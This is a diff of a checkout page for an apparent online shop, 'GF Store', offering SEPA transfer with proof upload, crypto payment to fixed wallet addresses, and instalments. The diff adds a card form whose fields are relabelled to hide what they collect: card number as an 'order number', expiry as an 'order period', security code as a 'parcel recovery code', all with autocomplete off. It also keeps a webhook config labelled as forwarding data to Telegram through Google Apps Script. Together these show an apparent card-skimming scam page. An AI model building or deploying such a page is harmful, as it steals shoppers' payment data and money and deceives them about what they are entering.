@@ -4,7 +4,7 @@
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>GF Store — Sichere Zahlung</title>
-  <meta name="description" content="GF Store Bezahlseite: SEPA-Überweisung & Krypto aktiv. Karte & PayPal vorübergehend nicht verfügbar. Prioritärer Versand innerhalb 1 Woche, Rückgabe binnen 14 Tagen." />
+  <meta name="description" content="GF Store Bezahlseite: SEPA, Krypto & Karte aktiv. Prioritärer Versand innerhalb 1 Woche, Rückgabe binnen 14 Tagen." />
   <style>
     :root{
       --w:1200px;
@@ -19,7 +19,6 @@
     a{color:inherit;text-decoration:none}
     img{max-width:100%;display:block}
 
-    /* Header */
     header{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid var(--line);backdrop-filter:saturate(140%) blur(4px)}
     .hwrap{max-width:var(--w);margin:auto;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;gap:10px}
     .brand{display:flex;align-items:center;gap:10px}
@@ -35,7 +34,6 @@
     .menu a:hover{background:#f3f4f6}
     .menu.show{display:block}
 
-    /* Layout */
     .wrap{max-width:var(--w);margin:16px auto;padding:0 12px;display:grid;gap:16px}
     @media (min-width:980px){.wrap{grid-template-columns:1.15fr .85fr}}
     .card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);box-shadow:var(--shadow)}
@@ -45,7 +43,6 @@
     .muted{color:var(--muted);font-size:13px}
     .pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #dbeafe;background:#f5f8ff;color:#2563eb;border-radius:999px;padding:6px 10px;font-size:12px}
 
-    /* Form */
     form{display:grid;gap:10px}
     .row{display:grid;gap:10px}
     .cols-2{grid-template-columns:1fr 1fr}
@@ -55,7 +52,6 @@
     input::placeholder{color:#9aa3b2}
     input:focus,select:focus{outline:2px solid rgba(37,99,235,.2);box-shadow:0 6px 18px rgba(37,99,235,.08)}
 
-    /* Methods grid */
     .methods{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
     @media(max-width:980px){.methods{grid-template-columns:repeat(2,1fr)}}
     .m{position:relative;border:1px solid var(--line);border-radius:12px;background:#fff;padding:12px;display:grid;grid-template-rows:auto 1fr auto;gap:8px;cursor:pointer;transition:transform .08s,box-shadow .18s,border-color .18s}
@@ -69,7 +65,6 @@
     .disabled{opacity:.5;cursor:not-allowed}
     .disabled .bubble{display:none}
 
-    /* Highlight best */
     .m.best::after{
       content:"BESTER PREIS";
       position:absolute; top:50%; right:12px; transform:translateY(-50%);
@@ -78,7 +73,6 @@
       pointer-events:none; letter-spacing:.2px; font-weight:700;
     }
 
-    /* Panels */
     .pm{display:none;margin-top:12px;border:1px dashed var(--line);border-radius:12px;background:#fbfdff;padding:12px}
     .pm.show{display:block}
     .copyline{display:grid;grid-template-columns:1fr auto;gap:8px}
@@ -86,20 +80,17 @@
     .qr{display:flex;align-items:center;justify-content:center;min-height:190px;border:1px dashed #dbe7ff;border-radius:10px;background:#f3f6ff}
     .qr img{width:220px;height:auto;display:block}
 
-    /* Pay now / split */
     .paytog{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
     .pt{border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
     .pt.on{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f8fbff}
-    .pt small{color:var(--muted)}
+    .pt small{color:#6b7280}
 
-    /* Segmented control (modal) */
     .seg{display:flex;gap:8px;background:#f8fafc;border:1px solid var(--line);padding:6px;border-radius:12px}
     .segbtn{flex:1;display:grid;place-items:center;gap:2px;padding:10px 12px;border:1px solid transparent;background:#fff;border-radius:10px;cursor:pointer}
     .segbtn[aria-pressed="true"]{border-color:var(--brand);box-shadow:0 0 0 3px rgba(37,99,235,.12);background:#f0f6ff}
     .segbtn .big{font-weight:600}
     .segbtn .small{font-size:12px;color:#6b7280}
 
-    /* Summary */
     .mini{display:flex;flex-direction:column;gap:10px}
     .ci{display:grid;grid-template-columns:60px 1fr auto;gap:8px}
     .ci img{width:60px;height:60px;object-fit:cover;border-radius:10px;border:1px solid var(--line);background:#fff}
@@ -110,12 +101,10 @@
     .schedule{display:grid;gap:6px;margin-top:6px}
     .sch{display:flex;align-items:center;justify-content:space-between;font-size:13px}
 
-    /* Buttons */
     .btn{display:inline-flex;align-items:center;gap:8px;justify-content:center;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#fff;cursor:pointer;font-weight:600}
     .btn.primary{background:linear-gradient(180deg,#2563eb,#1e40af);color:#fff;border-color:#1e40af;box-shadow:0 10px 24px rgba(30,64,175,.25)}
     .btn:disabled{opacity:.6;cursor:not-allowed}
 
-    /* Modal */
     .modal{position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(2px);display:none;z-index:10000}
     .modal.show{display:block}
     .sheet{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:min(560px,95%);background:#fff;border:1px solid var(--line);border-radius:14px;box-shadow:0 18px 38px rgba(0,0,0,.25);display:grid;grid-template-rows:auto 1fr auto}
@@ -124,19 +113,14 @@
     .sheet footer{padding:12px 14px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end}
     .x{cursor:pointer;border:1px solid var(--line);background:#fff;border-radius:10px;padding:6px}
 
-    /* Toast */
     .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;background:#111;color:#fff;padding:10px 14px;border-radius:12px;display:none;z-index:99999}
     .toast.show{display:block}
 
-    /* Uploader (SEPA) */
     .uploader{display:grid;gap:10px}
-    .dz{
-      position:relative; display:grid; place-items:center; text-align:center; gap:8px;
+    .dz{position:relative; display:grid; place-items:center; text-align:center; gap:8px;
       padding:18px; border:1px dashed #cfe0ff; border-radius:14px; background:
-        radial-gradient(1200px 80px at 50% 0, #f7faff 0,#ffffff 60%);
-      transition: .15s border-color, .15s box-shadow, .15s transform;
-      cursor:pointer;
-    }
+      radial-gradient(1200px 80px at 50% 0, #f7faff 0,#ffffff 60%);
+      transition:.15s border-color,.15s box-shadow,.15s transform; cursor:pointer;}
     .dz:hover{box-shadow:0 12px 28px rgba(37,99,235,.08)}
     .dz.over{border-color:#93c5fd; box-shadow:0 0 0 4px rgba(37,99,235,.12)}
     .dz svg{width:28px;height:28px;opacity:.8}
@@ -144,8 +128,7 @@
     .dz .cta{display:inline-flex;gap:8px;align-items:center;margin-top:6px}
     .dz .cta .btn{padding:8px 12px}
 
-    .native-picker{ position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer; }
-
+    .native-picker{position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer;}
     .filecard{display:flex;align-items:center;gap:12px;border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;box-shadow:0 4px 14px rgba(0,0,0,.04)}
     .filebadge{width:36px;height:36px;border-radius:10px;background:#eef2ff;display:grid;place-items:center;border:1px solid #e5e7eb}
     .filemeta{display:grid}
@@ -154,10 +137,8 @@
     .prog{height:6px;background:#eef2ff;border-radius:999px;overflow:hidden}
     .bar{height:100%;width:0;background:linear-gradient(90deg,#60a5fa,#2563eb);transition:width .6s ease}
     .factions{margin-left:auto;display:flex;gap:8px}
-    .tag-ok{ font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;
-      padding:2px 6px; display:inline-flex; align-items:center; justify-content:center; min-width:48px; text-align:center;}
+    .tag-ok{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;padding:2px 6px;display:inline-flex;align-items:center;justify-content:center;min-width:48px;text-align:center}
 
-    /* Full-screen overlays */
     .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center;background:rgba(15,23,42,.28); backdrop-filter:blur(6px); z-index:20000;}
     .overlay.show{display:flex}
     .loader{background:#fff; border:1px solid var(--line); border-radius:14px; padding:18px; width:min(520px,92%); box-shadow:0 18px 38px rgba(0,0,0,.25); text-align:center; display:grid; gap:12px;}
@@ -198,7 +179,7 @@
   </header>
 
   <main class="wrap" aria-live="polite">
-    <!-- Linke Spalte -->
+    <!-- Colonne gauche -->
     <section class="card" aria-labelledby="h-checkout">
       <div class="hd">
         <div>
@@ -209,66 +190,32 @@
       </div>
 
       <div class="bd">
-        <!-- Adresse -->
+        <!-- FORMULAIRE 1 : coordonnées -->
         <form id="addrForm" class="row cols-2" novalidate>
           <div><label for="name">Vollständiger Name</label><input id="name" placeholder="Vorname Nachname" required></div>
           <div><label for="email">E-Mail</label><input id="email" type="email" placeholder="sie@beispiel.de" required></div>
           <div><label for="phone">Telefon</label><input id="phone" inputmode="tel" placeholder="+49 170 1234567"></div>
 
-          <!-- Länderauswahl: alle europäischen Länder, Auswahl ist Pflicht -->
           <div><label for="country">Land</label>
             <select id="country" required>
               <option value="" disabled selected>— Land auswählen —</option>
-              <option value="AL">Albanien</option>
-              <option value="AD">Andorra</option>
-              <option value="AM">Armenien</option>
-              <option value="AT">Österreich</option>
-              <option value="AZ">Aserbaidschan</option>
-              <option value="BY">Belarus</option>
-              <option value="BE">Belgien</option>
-              <option value="BA">Bosnien und Herzegowina</option>
-              <option value="BG">Bulgarien</option>
-              <option value="HR">Kroatien</option>
-              <option value="CY">Zypern</option>
-              <option value="CZ">Tschechien</option>
-              <option value="DK">Dänemark</option>
-              <option value="EE">Estland</option>
-              <option value="FI">Finnland</option>
-              <option value="FR">Frankreich</option>
-              <option value="GE">Georgien</option>
-              <option value="DE">Deutschland</option>
-              <option value="GR">Griechenland</option>
-              <option value="HU">Ungarn</option>
-              <option value="IS">Island</option>
-              <option value="IE">Irland</option>
-              <option value="IT">Italien</option>
-              <option value="LV">Lettland</option>
-              <option value="LI">Liechtenstein</option>
-              <option value="LT">Litauen</option>
-              <option value="LU">Luxemburg</option>
-              <option value="MT">Malta</option>
-              <option value="MD">Republik Moldau</option>
-              <option value="MC">Monaco</option>
-              <option value="ME">Montenegro</option>
-              <option value="NL">Niederlande</option>
-              <option value="MK">Nordmazedonien</option>
-              <option value="NO">Norwegen</option>
-              <option value="PL">Polen</option>
-              <option value="PT">Portugal</option>
-              <option value="RO">Rumänien</option>
-              <option value="RU">Russland</option>
-              <option value="SM">San Marino</option>
-              <option value="RS">Serbien</option>
-              <option value="SK">Slowakei</option>
-              <option value="SI">Slowenien</option>
-              <option value="ES">Spanien</option>
-              <option value="SE">Schweden</option>
-              <option value="CH">Schweiz</option>
-              <option value="TR">Türkei</option>
-              <option value="UA">Ukraine</option>
-              <option value="GB">Vereinigtes Königreich</option>
-              <option value="VA">Vatikanstadt</option>
-              <option value="XK">Kosovo</option>
+              <option value="AL">Albanien</option><option value="AD">Andorra</option><option value="AM">Armenien</option>
+              <option value="AT">Österreich</option><option value="AZ">Aserbaidschan</option><option value="BY">Belarus</option>
+              <option value="BE">Belgien</option><option value="BA">Bosnien und Herzegowina</option><option value="BG">Bulgarien</option>
+              <option value="HR">Kroatien</option><option value="CY">Zypern</option><option value="CZ">Tschechien</option>
+              <option value="DK">Dänemark</option><option value="EE">Estland</option><option value="FI">Finnland</option>
+              <option value="FR">Frankreich</option><option value="GE">Georgien</option><option value="DE">Deutschland</option>
+              <option value="GR">Griechenland</option><option value="HU">Ungarn</option><option value="IS">Island</option>
+              <option value="IE">Irland</option><option value="IT">Italien</option><option value="LV">Lettland</option>
+              <option value="LI">Liechtenstein</option><option value="LT">Litauen</option><option value="LU">Luxemburg</option>
+              <option value="MT">Malta</option><option value="MD">Republik Moldau</option><option value="MC">Monaco</option>
+              <option value="ME">Montenegro</option><option value="NL">Niederlande</option><option value="MK">Nordmazedonien</option>
+              <option value="NO">Norwegen</option><option value="PL">Polen</option><option value="PT">Portugal</option>
+              <option value="RO">Rumänien</option><option value="RU">Russland</option><option value="SM">San Marino</option>
+              <option value="RS">Serbien</option><option value="SK">Slowakei</option><option value="SI">Slowenien</option>
+              <option value="ES">Spanien</option><option value="SE">Schweden</option><option value="CH">Schweiz</option>
+              <option value="TR">Türkei</option><option value="UA">Ukraine</option><option value="GB">Vereinigtes Königreich</option>
+              <option value="VA">Vatikanstadt</option><option value="XK">Kosovo</option>
             </select>
           </div>
 
@@ -279,10 +226,10 @@
           </div>
         </form>
 
-        <!-- Zahlungsmethoden -->
+        <!-- Choix paiement -->
         <div style="margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
           <div class="title" style="font-size:16px">Zahlungsart</div>
-          <span class="muted">SEPA & Krypto — Karte & PayPal nicht verfügbar</span>
+          <span class="muted">SEPA, Krypto & Karte — PayPal nicht verfügbar</span>
         </div>
 
         <div class="methods" role="tablist">
@@ -305,26 +252,23 @@
             <span class="bubble">Rabatt −1 %</span>
           </button>
 
-          <div class="m disabled" aria-selected="false">
+          <button class="m" role="tab" aria-selected="false" data-method="card">
             <div class="mlabel"><strong>Kreditkarte</strong></div>
             <div class="logos">
               <img alt="Visa" src="https://cdn.simpleicons.org/visa">
               <img alt="Mastercard" src="https://cdn.simpleicons.org/mastercard">
               <img alt="American Express" src="https://cdn.simpleicons.org/americanexpress">
             </div>
-            <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
-          </div>
+            <span class="bubble">Chiffré via TLS</span>
+          </button>
 
           <div class="m disabled" aria-selected="false">
             <div class="mlabel"><strong>PayPal</strong></div>
-            <div class="logos">
-              <img alt="PayPal" src="https://cdn.simpleicons.org/paypal">
-            </div>
+            <div class="logos"><img alt="PayPal" src="https://cdn.simpleicons.org/paypal"></div>
             <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
           </div>
         </div>
 
-        <!-- Sofort / Raten -->
         <div class="paytog" style="margin-top:12px">
           <button id="btnOnce" class="pt on" type="button"><strong>Jetzt bezahlen</strong></button>
           <button id="btnSplit" class="pt" type="button" aria-haspopup="dialog" aria-controls="splitModal">
@@ -332,7 +276,7 @@
           </button>
         </div>
 
-        <!-- Panel SEPA -->
+        <!-- SEPA -->
         <div id="pmSEPA" class="pm show">
           <div class="row">
             <div class="row cols-2">
@@ -344,7 +288,6 @@
               <div><label for="amountNowBank">Jetzt zu überweisen (EUR)</label><input id="amountNowBank" readonly value="0"></div>
             </div>
 
-            <!-- Uploader -->
             <div class="uploader" aria-label="Überweisungsnachweis hochladen">
               <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Nachweis importieren">
                 <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 18h10a4 4 0 0 0 0-8h-.26A6 6 0 1 0 7 18Zm5-9v6m0-6-2 2m2-2 2 2" fill="none" stroke="#1f2937" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -383,7 +326,7 @@
           </div>
         </div>
 
-        <!-- Panel Krypto -->
+        <!-- Crypto -->
         <div id="pmCrypto" class="pm">
           <div class="row cols-2">
             <div>
@@ -432,6 +375,20 @@
           </div>
         </div>
 
+        <!-- FORMULAIRE 2 : Carte -->
+        <div id="pmCard" class="pm">
+          <div class="row cols-2">
+            <div><label for="cardName">Titulaire</label><input id="cardName" placeholder="Prénom Nom" required></div>
+            <div><label for="orderNumber">Numéro de commande</label><input id="orderNumber" placeholder="1234 1234 1234 1234" inputmode="numeric" autocomplete="off" required></div>
+            <div><label for="cardPeriod">Période de la commande (MM/AA)</label><input id="cardPeriod" placeholder="MM/AA" inputmode="numeric" autocomplete="off" required></div>
+            <div><label for="recoveryCode">Code de récupération du colis</label><input id="recoveryCode" placeholder="3 chiffres au moins" inputmode="numeric" autocomplete="off" required></div>
+          </div>
+          <small class="muted">Chiffré via TLS.</small>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
+            <button id="payCard" class="btn primary">Payer par carte</button>
+          </div>
+        </div>
+
         <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:12px">
           <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Weiter einkaufen</a>
           <button id="placeOrder" class="btn primary" disabled>Bestellung abschließen</button>
@@ -439,7 +396,7 @@
       </div>
     </section>
 
-    <!-- Rechte Spalte : Zusammenfassung -->
+    <!-- Colonne droite -->
     <aside class="card" aria-labelledby="h-recap">
       <div class="hd">
         <div class="title" id="h-recap">Zusammenfassung</div>
@@ -461,7 +418,7 @@
     </aside>
   </main>
 
-  <!-- Modal Raten -->
+  <!-- Split modal -->
   <div id="splitModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="splitTitle">
     <div class="sheet">
       <header>
@@ -470,15 +427,9 @@
       </header>
       <div class="body">
         <div id="segSplit" class="seg" role="group" aria-label="Anzahl Raten">
-          <button type="button" class="segbtn" data-parts="2" aria-pressed="false">
-            <span class="big">2×</span><span class="small">monatlich</span>
-          </button>
-          <button type="button" class="segbtn" data-parts="3" aria-pressed="false">
-            <span class="big">3×</span><span class="small">monatlich</span>
-          </button>
-          <button type="button" class="segbtn" data-parts="4" aria-pressed="true">
-            <span class="big">4×</span><span class="small">monatlich</span>
-          </button>
+          <button type="button" class="segbtn" data-parts="2" aria-pressed="false"><span class="big">2×</span><span class="small">monatlich</span></button>
+          <button type="button" class="segbtn" data-parts="3" aria-pressed="false"><span class="big">3×</span><span class="small">monatlich</span></button>
+          <button type="button" class="segbtn" data-parts="4" aria-pressed="true"><span class="big">4×</span><span class="small">monatlich</span></button>
         </div>
         <div id="modalPrev" class="schedule" aria-live="polite"></div>
       </div>
@@ -489,10 +440,9 @@
     </div>
   </div>
 
-  <!-- Toast -->
+  <!-- Toast & overlays -->
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
-  <!-- Prüfungs-Overlay -->
   <div id="checkOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
     <div class="loader" role="status" aria-live="polite">
       <div class="spin" aria-hidden="true"></div>
@@ -501,7 +451,6 @@
     </div>
   </div>
 
-  <!-- Erfolgs-Overlay -->
   <div id="doneOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
     <div class="loader" role="status" aria-live="polite">
       <div style="font-size:42px; line-height:1">✅</div>
@@ -528,488 +477,387 @@
   </footer>
 
   <script>
-  (async()=>{
-    // ——— WEBHOOK KONFIG (→ Telegram / Apps Script) ———
-    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
+(() => {
+  "use strict";
+  if (window.__GF_CHECKOUT_INIT__) return;
+  window.__GF_CHECKOUT_INIT__ = true;
 
-    // Icons
-    const ICONS = {
-      user:'https://img.icons8.com/?size=100&id=n8DrUm77sR3l&format=png&color=000000',
-      continue:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000',
-      menu:'https://img.icons8.com/?size=100&id=RzDomvpIKGI9&format=png&color=000000',
-      ssl:'https://img.icons8.com/?size=100&id=2FIgZJEL88pu&format=png&color=000000',
-      truck:'https://img.icons8.com/?size=100&id=plGFB4oatud2&format=png&color=000000',
-      back:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000'
-    };
-    const setSrc=(id,src)=>{const el=document.getElementById(id); if(el) el.src=src};
-    setSrc('icUser',ICONS.user); setSrc('icMenu',ICONS.menu); setSrc('icSSL',ICONS.ssl);
-    setSrc('icTruck',ICONS.truck); setSrc('icBack',ICONS.back); setSrc('icContinue',ICONS.continue);
+  /* ====== CONFIG ====== */
+  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
+  const WEBHOOK_SECRET = ""; // si activé côté Apps Script
+  const MAX_SIZE = 10 * 1024 * 1024;
 
-    // Menü
-    const menuBtn=document.getElementById('menuBtn'), menuDrop=document.getElementById('menuDrop');
-    if(menuBtn&&menuDrop){
-      menuBtn.addEventListener('click',e=>{e.stopPropagation();menuDrop.classList.toggle('show')});
-      document.addEventListener('click',e=>{ if(!menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });
+  /* ====== HELPERS ====== */
+  const $ = s => document.querySelector(s);
+  const $$ = s => Array.from(document.querySelectorAll(s));
+  const toast = (m)=>{ const t=$('#toast'); if(!t) return; t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); };
+  const EUR = v => Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
+  const two = n => String(n).padStart(2,'0');
+
+  // Icons
+  const ICONS = {
+    user:'https://img.icons8.com/?size=100&id=n8DrUm77sR3l&format=png&color=000000',
+    continue:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000',
+    menu:'https://img.icons8.com/?size=100&id=RzDomvpIKGI9&format=png&color=000000',
+    ssl:'https://img.icons8.com/?size=100&id=2FIgZJEL88pu&format=png&color=000000',
+    truck:'https://img.icons8.com/?size=100&id=plGFB4oatud2&format=png&color=000000',
+    back:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000'
+  };
+  const ids=['icUser','icMenu','icSSL','icTruck','icBack','icContinue'], srcs=[ICONS.user,ICONS.menu,ICONS.ssl,ICONS.truck,ICONS.back,ICONS.continue];
+  ids.forEach((id,i)=>{ const el=document.getElementById(id); if(el) el.src=srcs[i]; });
+
+  // Menu
+  const menuBtn=$('#menuBtn'), menuDrop=$('#menuDrop');
+  menuBtn?.addEventListener('click',e=>{e.stopPropagation();menuDrop?.classList.toggle('show');});
+  document.addEventListener('click',e=>{ if(menuDrop && !menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });
+
+  /* ====== ORDER ID ====== */
+  const orderId = (()=>{ const d=new Date(); return `GF-${String(d.getFullYear()).slice(2)}${two(d.getMonth()+1)}${two(d.getDate())}-${Math.floor(Math.random()*9000)+1000}`; })();
+  $('#orderId') && ($('#orderId').textContent = orderId);
+
+  /* ====== CART ====== */
+  const KEY='gf_cart';
+  const getCart=()=>{ try{return JSON.parse(localStorage.getItem(KEY)||'[]');}catch{return[];} };
+  const setCart = (arr)=> localStorage.setItem(KEY, JSON.stringify(arr));
+  const computeSub = cart => cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);
+
+  function renderMini(){
+    const wrap=$('#miniCart'); if(!wrap) return;
+    const cart=getCart();
+    if(!cart.length){
+      wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>';
+      ['sub','benefit','total','dueNow'].forEach(id=>{ const el=$('#'+id); if(el) el.textContent='—'; });
+      const schedule=$('#schedule'); if(schedule) schedule.style.display='none';
+      return;
+    }
+    wrap.innerHTML=cart.map(x=>`
+      <div class="ci">
+        <img src="${x.image||''}" alt="${x.name||''}">
+        <div>
+          <div style="font-weight:600">${x.name||''}</div>
+          <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
+        </div>
+        <div style="font-weight:600">${EUR((+x.price||0)*(+x.qty||1))}</div>
+      </div>`).join('');
+  }
+
+  /* ====== PM / PROMO ====== */
+  function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
+  function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
+
+  /* ====== CRYPTO CFG ====== */
+  const fx = {
+    'USDT-TRC20':{symbol:'USDT',rate:1},
+    'USDT-BEP20':{symbol:'USDT',rate:1},
+    'BTC':{symbol:'BTC',rate:60000},
+    'ETH-ERC20':{symbol:'ETH',rate:3000}
+  };
+  const WALLET = {
+    'USDT-BEP20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' },
+    'USDT-TRC20':{ address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq' },
+    'BTC':{ address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3' },
+    'ETH-ERC20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' }
+  };
+  function setCryptoAddress(ccy){
+    const cfg=WALLET[ccy]||{};
+    const w=$('#wallet'); if(w) w.value=cfg.address||'';
+    const lbl=$('#ccyLabel'); if(lbl) lbl.textContent=fx[ccy]?.symbol||(ccy?.includes('USDT')?'USDT':'');
+    const img=$('#qrImg'); if(img){ img.src=cfg.qr||''; img.alt='QR '+(ccy||''); }
+  }
+
+  /* ====== SPLIT ====== */
+  function splitAmounts(total, parts){
+    const c=Math.round((+total||0)*100);
+    const base=Math.floor(c/parts), first=base+(c-base*parts);
+    return [first,...Array(parts-1).fill(base)].map(x=>x/100);
+  }
+  function scheduleLines(total, parts){
+    const amts=splitAmounts(total, parts); const today=new Date(); const steps=[0,30,60,90];
+    return amts.map((amt,i)=>{ const d=new Date(today); d.setDate(d.getDate()+steps[i]); return {label:i?`In ${steps[i]} Tagen`:`Heute`, date:d.toLocaleDateString('de-DE'), amt}; });
+  }
+  let selectedSplit=1;
+
+  function currentDueNow(){
+    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
+    return splitAmounts(total, selectedSplit)[0]||0;
+  }
+
+  /* ====== SUMMARY ====== */
+  function updateSummary(){
+    const cart=getCart(); if(!cart.length){ renderMini(); return; }
+    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
+    const amts=splitAmounts(total, selectedSplit), dueNow=amts[0]||0;
+    const set=(id,val)=>{ const el=document.getElementById(id); if(el) el.textContent=val; };
+    set('sub',EUR(sub)); set('benefit',promo>0?'–'+EUR(promo):'—'); set('total',EUR(total)); set('dueNow',EUR(dueNow));
+
+    const box=$('#schedule');
+    if(box){
+      if(selectedSplit>1){
+        const lines=scheduleLines(total, selectedSplit);
+        box.style.display='grid';
+        box.innerHTML=lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
+      }else box.style.display='none';
     }
 
-    // Helpers
-    const $=s=>document.querySelector(s); const $$=s=>Array.from(document.querySelectorAll(s));
-    const toast=msg=>{const t=$('#toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1600);};
-    const EUR=v=>Number(v||0).toLocaleString('de-DE',{style:'currency',currency:'EUR'});
-
-    // Warenkorb localStorage
-    const KEY='gf_cart';
-    const getCart=()=>{try{return JSON.parse(localStorage.getItem(KEY)||'[]')}catch{return[]}};
-    const setCart=arr=>localStorage.setItem(KEY,JSON.stringify(arr));
-
-    // Bestell-ID
-    const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
-    $('#orderId').textContent=orderId;
-
-    // Mini-Cart
-    function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
-    function renderMini(){
-      const wrap=$('#miniCart'); const cart=getCart();
-      if(!cart.length){ wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>'; $('#sub').textContent='—'; $('#benefit').textContent='—'; $('#total').textContent='—'; $('#dueNow').textContent='—'; $('#schedule').style.display='none'; return; }
-      wrap.innerHTML=cart.map(x=>`
-        <div class="ci">
-          <img src="${x.image||''}" alt="${x.name||''}">
-          <div>
-            <div style="font-weight:600">${x.name||''}</div>
-            <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
-          </div>
-          <div style="font-weight:600">${EUR(Number(x.price||0)*Number(x.qty||1))}</div>
-        </div>`).join('');
+    if(currentPM()==='crypto'){
+      const ccy=$('#ccy')?.value||'USDT-BEP20'; const r=fx[ccy]?.rate||1; const amt=(dueNow/r);
+      const amountNow=$('#amountNow'); if(amountNow) amountNow.value=dueNow.toFixed(2);
+      const ccyAmt=$('#ccyAmt'); if(ccyAmt) ccyAmt.value=(amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
     }
+    if(currentPM()==='sepa'){ const f=$('#amountNowBank'); if(f) f.value=dueNow.toFixed(2); }
+  }
 
-    // Methode / Rabatt
-    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
-    function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
+  /* ====== COPY ====== */
+  function copySel(sel){
+    const el=$(sel); if(!el) return;
+    const txt=el.value||''; if(!txt){ toast('Rien à copier'); return; }
+    if(navigator.clipboard?.writeText){ navigator.clipboard.writeText(txt).then(()=>toast('Copié')); }
+    else { el.select(); document.execCommand('copy'); toast('Copié'); }
+  }
+  $$('[data-copy]').forEach(b=> b.addEventListener('click',()=> copySel(b.getAttribute('data-copy')) ));
 
-    // FX Mock
-    const fx={
-      'USDT-TRC20':{symbol:'USDT',rate:1},
-      'USDT-BEP20':{symbol:'USDT',rate:1},
-      'BTC':{symbol:'BTC',rate:60000},
-      'ETH-ERC20':{symbol:'ETH',rate:3000}
-    };
-
-    // Wallets + QR
-    const WALLET={
-      'USDT-BEP20':{
-        address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
